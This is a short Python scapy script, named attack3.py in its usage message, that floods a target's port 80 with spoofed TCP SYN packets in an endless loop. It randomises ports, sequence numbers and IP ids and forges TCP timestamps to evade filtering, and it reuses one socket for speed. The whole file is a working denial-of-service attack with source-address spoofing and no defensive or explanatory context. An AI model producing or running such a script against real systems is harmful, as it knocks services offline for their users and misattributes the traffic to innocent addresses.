#last resort 

from scapy.all import *
import sys
import random as rnd
import time

if(len(sys.argv) < 3 or len(sys.argv) > 4):
	print("Usage: attack3.py <destination ip> <source ip> <optional init timestamp>")
	exit()

dstIP = sys.argv[1]
srcIP = sys.argv[2]
init_timestamp = 0

if (len(sys.argv) > 3):
	init_timestamp = int(sys.argv[3])

packet = IP()/TCP()
packet[IP].dst = dstIP
packet[IP].src = srcIP
packet[IP].flags = 'DF'
packet[TCP].dport = 80
packet[TCP].flags = "S"
packet[TCP].window = 65495
starting_time = time.time()
timestamp = 0
s = conf.L3socket() #greatly increases packet send rate as we reuse the same socket instead of creating one for each packet
while(True):
	packet[IP].id = rnd.randint(0, (2**16)-1)
	packet[TCP].sport = rnd.randint(1024,65535)
	packet[TCP].seq = rnd.randint(0, (2**32)-1)
	if init_timestamp != 0:
		delta_t = time.time() - starting_time
		delta_t = int(delta_t * 1000)
		timestamp = init_timestamp + delta_t
	else:
		timestamp = rnd.randint(0, (2**32)-1)
	packet[TCP].options = [('MSS', 65495), ('SAckOK', ''), ('Timestamp', (timestamp, 0)), ('NOP', ()), ('WScale', 7)]
	s.send(packet)
